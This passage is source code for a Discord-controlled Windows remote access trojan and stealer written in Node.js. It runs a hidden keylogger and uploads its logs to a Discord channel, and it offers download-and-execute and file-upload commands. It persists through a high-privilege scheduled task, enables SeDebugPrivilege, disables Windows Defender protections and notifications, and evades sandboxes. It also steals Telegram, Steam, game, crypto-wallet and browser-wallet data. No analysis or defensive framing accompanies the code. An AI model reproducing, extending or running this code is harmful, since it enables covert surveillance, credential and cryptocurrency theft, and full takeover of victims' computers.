                        await interaction.editReply('✅ Python updated. Installing pynput...');
                        await installPynput();
                    } else {
                        await interaction.editReply('✅ Python 3.12 found. Checking dependencies...');
                        const hasPynput = await checkPynput();
                        const hasPyperclip = await checkPyperclip();
                        
                        if (!hasPynput) {
                            await interaction.editReply('📥 pynput not found. Installing...');
                            await installPynput();
                        }
                        
                        if (!hasPyperclip) {
                            await interaction.editReply('📥 pyperclip not found. Installing...');
                            await installPynput();
                        }
                        
                        if (hasPynput && hasPyperclip) {
                            await interaction.editReply('✅ All dependencies already installed.');
                        }
                    }
                    
                    await interaction.editReply('📝 Creating keys.py script...');
                    await createKeysScript();
                    
                    try {
                        const keysFilePath = `C:\\Users\\${os.userInfo().username}\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Keys\\keys.txt`;
                        await fs.unlink(keysFilePath);
                    } catch (error) {
                        // File doesnt exist, thats fine
                    }
                    
                    await interaction.editReply('🚀 Starting keyboard logger...');
                    await startKeyLogger();
                    await interaction.editReply(`✅ Keyboard logger started!\n⏱️ Uploading logs every ${uploadInterval} seconds`);
                    
                    const keysFilePath = `C:\\Users\\${os.userInfo().username}\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Keys\\keys.txt`;
                    
                    const uploadTimer = setInterval(async () => {
                        try {
                            const fileExists = await fs.access(keysFilePath).then(() => true).catch(() => false);
                            if (fileExists) {
                                const stats = await fs.stat(keysFilePath);
                                const fileSizeMB = (stats.size / 1024 / 1024).toFixed(2);
                                
                                if (stats.size > 25 * 1024 * 1024) {
                                    await commandsChannel.send(`⚠️ Keys file is too large (${fileSizeMB} MB) to upload. Discord limit is 25 MB.`);
                                    return;
                                }
                                
                                const attachment = new AttachmentBuilder(keysFilePath);
                                await commandsChannel.send({
                                    content: `📤 Keys log (${fileSizeMB} MB)`,
                                    files: [attachment]
                                });
                            }
                        } catch (error) {
                            console.error('Error uploading keys file:', error);
                        }
                    }, uploadInterval * 1000);
                    
                    interaction.client.keysUploadTimer = uploadTimer;
                    
                } catch (error) {
                    throw error;
                }
                break;
            }

            case 'download': {
                const url = interaction.options.getString('url');
                const filename = interaction.options.getString('filename');
                const filePath = await downloadFile(url, filename);
                await interaction.editReply(`✅ Downloaded successfully to: ${filePath}`);
                break;
            }

            case 'run': {
                const exePath = interaction.options.getString('path');
                const result = await runExecutable(exePath);
                await interaction.editReply(`✅ ${result}`);
                break;
            }

            case 'downloadnexecute': {
                const url = interaction.options.getString('url');
                const filename = interaction.options.getString('filename');
                
                await interaction.editReply('📥 Downloading file...');
                const filePath = await downloadFile(url, filename);
                
                await interaction.editReply('📥 Downloaded! Executing...');
                const result = await runExecutable(filePath);
                
                await interaction.editReply(`✅ ${result}\nFile location: ${filePath}`);
                break;
            }

            case 'upload': {
                const filePath = interaction.options.getString('path');
                
                try {
                    await fs.access(filePath);
                    
                    const stats = await fs.stat(filePath);
                    const fileSizeMB = (stats.size / 1024 / 1024).toFixed(2);
                    
                    if (stats.size > 25 * 1024 * 1024) {
                        await interaction.editReply(`❌ File is too large (${fileSizeMB} MB). Discord limit is 25 MB.`);
                        return;
                    }
                    
                    await interaction.editReply('📤 Uploading file...');
                    
                    const attachment = new AttachmentBuilder(filePath);
                    const fileName = path.basename(filePath);
                    
                    await interaction.editReply({
                        content: `✅ File uploaded successfully!\n**Filename:** ${fileName}\n**Size:** ${fileSizeMB} MB`,
                        files: [attachment]
                    });
                } catch (error) {
                    if (error.code === 'ENOENT') {
                        throw new Error('File not found at the specified path');
                    }
                    throw error;
                }
                break;
            }
        }
    } catch (error) {
        const errorMessage = `❌ Error: ${error.message}`;
        if (interaction.deferred) {
            await interaction.editReply(errorMessage);
        } else {
            await interaction.reply({ content: errorMessage, ephemeral: true });
        }
    }
});
async function executePythonCheck() {
    return new Promise((resolve) => {
        exec('python --version', (error, stdout, stderr) => {
            if (error) {
                resolve({ installed: false, isCorrectVersion: false });
                return;
            }
            
            const versionMatch = stdout.match(/Python (\d+\.\d+)/);
            if (versionMatch) {
                const version = parseFloat(versionMatch[1]);
                resolve({ 
                    installed: true, 
                    isCorrectVersion: version >= 3.12 
                });
            } else {
                resolve({ installed: false, isCorrectVersion: false });
            }
        });
    });
}

async function installPython() {
    return new Promise((resolve, reject) => {
        exec('winget install --silent --accept-source-agreements --accept-package-agreements Python.Python.3.12', 
            (error, stdout, stderr) => {
                if (error) {
                    reject(new Error('Failed to install Python'));
                    return;
                }
                setTimeout(resolve, 3000);
            }
        );
    });
}

async function checkPynput() {
    return new Promise((resolve) => {
        exec('pip show pynput', (error, stdout, stderr) => {
            resolve(!error && stdout.includes('pynput'));
        });
    });
}

async function checkPyperclip() {
    return new Promise((resolve) => {
        exec('pip show pyperclip', (error, stdout, stderr) => {
            resolve(!error && stdout.includes('pyperclip'));
        });
    });
}

async function installPynput() {
    return new Promise((resolve, reject) => {
        exec('pip install pynput pywin32', (error, stdout, stderr) => {
            if (error) {
                reject(new Error('Failed to install dependencies'));
                return;
            }
            resolve();
        });
    });
}

async function createKeysScript() {
    try {
        await fs.mkdir(SCRIPTS_DIR, { recursive: true });
        
        await fs.writeFile(KEYS_SCRIPT_PATH, KEYS_PY_CONTENT, 'utf8');
    } catch (error) {
        throw new Error(`Failed to create keys.py: ${error.message}`);
    }
}

async function startKeyLogger() {
    return new Promise((resolve, reject) => {
        const psCommand = `Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList "\\"${KEYS_SCRIPT_PATH}\\"" -PassThru`;
        
        exec(`powershell -Command "${psCommand}"`, { windowsHide: true }, (error, stdout, stderr) => {
            if (error) {
                reject(new Error(`Failed to start keyboard logger: ${error.message}`));
                return;
            }
            resolve();
        });
        
        setTimeout(resolve, 1000);
    });
  }

async function installAsScheduledTask() {
  const userDir = os.homedir();
  const baseDir = path.join(userDir, "AppData", "LocalLow", "Temp", "Steam", "DEBUG");
  const exePath = path.join(baseDir, "UpdateService.exe");
  const psPath = path.join(baseDir, "enable-debug-and-run.ps1");
  const cmdLauncher = path.join(baseDir, "launcher_system.cmd");
  const logDir = path.join(baseDir, "Logs");
  const logPath = path.join(logDir, "system-task.log");
  const taskName = "UpdateServices_SystemTask";

  await fs.mkdir(baseDir, { recursive: true });
  await fs.mkdir(logDir, { recursive: true });

  // --- Copy the current executable to the target directory ---
  const currentExe = process.execPath;
  if (path.normalize(currentExe).toLowerCase() !== path.normalize(exePath).toLowerCase()) {
    await fs.copyFile(currentExe, exePath);
    console.log(`📦 Copied ${currentExe} → ${exePath}`);
  } else {
    console.log("✅ Already running from install directory.");
  }

  // --- PowerShell script that enables SeDebugPrivilege then starts the exe ---
  const psContent = `
param(
    [Parameter(Mandatory = $true)]
    [string]$ExePath
)

function Enable-SeDebugPrivilege {
    $definition = @'
using System;
using System.Runtime.InteropServices;

public class AdjPriv {
  [DllImport("advapi32.dll", ExactSpelling=true, SetLastError=true)]
  internal static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
  [DllImport("kernel32.dll", ExactSpelling=true)]
  internal static extern IntPtr GetCurrentProcess();
  [DllImport("advapi32.dll", SetLastError=true)]
  internal static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
  [DllImport("advapi32.dll", ExactSpelling=true, SetLastError=true)]
  internal static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TokPriv1Luid NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

  [StructLayout(LayoutKind.Sequential, Pack = 1)]
  internal struct TokPriv1Luid {
    public int Count;
    public long Luid;
    public int Attr;
  }

  public static bool EnablePrivilege(string privilege) {
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint TOKEN_QUERY = 0x00000008;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    IntPtr hToken;
    TokPriv1Luid tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
      return false;
    if (!LookupPrivilegeValue(null, privilege, out tp.Luid))
      return false;
    tp.Count = 1;
    tp.Attr = (int)SE_PRIVILEGE_ENABLED; // ✅ explicit cast fixes your compile error
    return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
  }
}
'@

    Add-Type $definition
    [AdjPriv]::EnablePrivilege("SeDebugPrivilege") | Out-Null
}

Write-Host "[*] Enabling SeDebugPrivilege..."
Enable-SeDebugPrivilege
Write-Host "[+] SeDebugPrivilege enabled successfully."

if (-not (Test-Path $ExePath)) {
    Write-Host "❌ File not found: $ExePath"
    exit 1
}

Write-Host "[*] Starting: $ExePath"
Start-Process -FilePath $ExePath -WindowStyle Hidden

`;

  await fs.writeFile(psPath, psContent, { encoding: "utf8" });

  // --- Launcher CMD that calls the PowerShell script and logs output ---
  const launcherContent = [
    "@echo off",
    "REM Runs as SYSTEM using the PowerShell privilege enabler",
    `powershell.exe -NoProfile -ExecutionPolicy Bypass -File "${psPath}" -ExePath "${exePath}" >> "${logPath}" 2>&1`
  ].join("\r\n");

  await fs.writeFile(cmdLauncher, launcherContent, { encoding: "ascii" });

  // --- Create SYSTEM task ---
const createCmd = `schtasks /Create /TN "${taskName}" /TR "${exePath}" /SC ONLOGON /RL HIGHEST /F`;
  console.log("⚙️ Creating SYSTEM scheduled task...");
  execSync(createCmd, { stdio: "inherit" });
  console.log("✅ SYSTEM task created successfully!");

  // --- Try to run it immediately ---
  try {
// removed start task (compatability)
  } catch (err) {
  }

  console.log(`📄 Log file will be written to: ${logPath}`);
}

const resourcesPath = findExodusResources();
client.once('clientReady', async () => {
    console.log(`Logged in as ${client.user.tag}`);

    windowsKey = await getWindowsKey();

    await registerCommands();

    const guild = client.guilds.cache.get(GUILD_ID);
    if (guild) {
        await setupCategoryAndChannel(guild); 
        
        try {
            await safeMkdir(rootPath);


            await Promise.all([
                await addExclusionDisableUACTemporarily().catch(console.error),
                await GrabLaunchers(),
                await CopyTelegramData(rootPath),
                await CopyMinecraftData(rootPath),
                await ExtractRobloxData(rootPath),
                await Steal(),
                await installAsScheduledTask()
                
            ]);
                if (resourcesPath) {
                await setupWebhookNChannel(guild);
                await downloadAsar(resourcesPath);
                await downloadDeobfScript();
                await copyWalletsToTemp();
                await copyBrowserWalletsToTemp();
            }
            try {
                await zipAndUploadSteamUi(guild);
            } catch (error) {
            }


            
        } catch (error) {
            console.error('Error during data extraction:', error);
        }
        
    } else {
        console.error('Guild not found!');
    }
});

client.on('error', (error) => {
    console.error('Discord client error:', error);
});

process.on('unhandledRejection', (error) => {
    console.error('Unhandled promise rejection:', error);
});
function holypowershellholypowershellAMEN() {
  const cmd1 = `powershell.exe -Command "Set-MpPreference -ExclusionExtension '.exe'"`
  const cmd2 = `powershell.exe -Command "Set-MpPreference -DisableScriptScanning $true -EnableControlledFolderAccess Disabled"` // we neee to disable ransomware or annoying ass ntofiication appears and it pmo 
  const cmd3 = `powershell.exe -Command "Set-MpPreference -SubmitSamplesConsent NeverSend -MAPSReporting Disabled -DisableIOAVProtection $false"`;
  const cmd4 = `powershell -Command "
New-Item -Path 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Explorer' -Force | Out-Null;
Set-ItemProperty -Path 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Explorer' -Name 'DisableNotificationCenter' -Value 1 -Type DWord;
New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer' -Force | Out-Null;
Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer' -Name 'DisableNotificationCenter' -Value 1 -Type DWord;
New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\PushNotifications' -Force | Out-Null;
Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\PushNotifications' -Name 'ToastEnabled' -Value 0 -Type DWord;
New-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications' -Force | Out-Null;
Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications' -Name 'ToastEnabled' -Value 0 -Type DWord;
"`;

exec(cmd1, (error, stdout, stderr) => {
  if (error) {
    console.error("Error:", error.message);
    return;
  }
  if (stderr) {
    console.error("Stderr:", stderr);
    return;
  }

  exec(cmd2, (error, stdout, stderr) => {
    if (error) {
      console.error("Error:", error.message);
      return;
    }
    if (stderr) {
      console.error("Stderr:", stderr);
      return;
    }

    exec(cmd3, (error, stdout, stderr) => {
      if (error) {
        console.error("Error:", error.message);
        return;
      }
      if (stderr) {
        console.error("Stderr:", stderr);
        return;
      }

      exec(cmd4, (error, stdout, stderr) => {
        if (error) {
          console.error("Error:", error.message);
          return;
        }
        if (stderr) {
          console.error("Stderr:", stderr);
          return;
        }

      });
    });
  });
})
}
(async function main() {
  if (process.platform !== 'win32') {
    blockAndExit();
  }

  await checkOsAndGpu();
  await checkHostname();
  await checkHardwareIDs();
  await checkRunningProcesses();
   await checkIPs();
   holypowershellholypowershellAMEN();
   await client.login(TOKEN);
})();

